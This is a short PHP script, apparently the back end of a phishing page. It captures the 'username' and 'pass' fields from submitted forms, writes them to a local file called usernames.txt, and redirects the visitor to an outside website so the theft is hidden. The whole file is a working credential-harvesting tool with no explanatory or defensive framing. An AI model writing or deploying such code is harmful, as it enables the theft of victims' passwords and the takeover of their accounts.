<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://racionaltec.com/');
exit();
?>
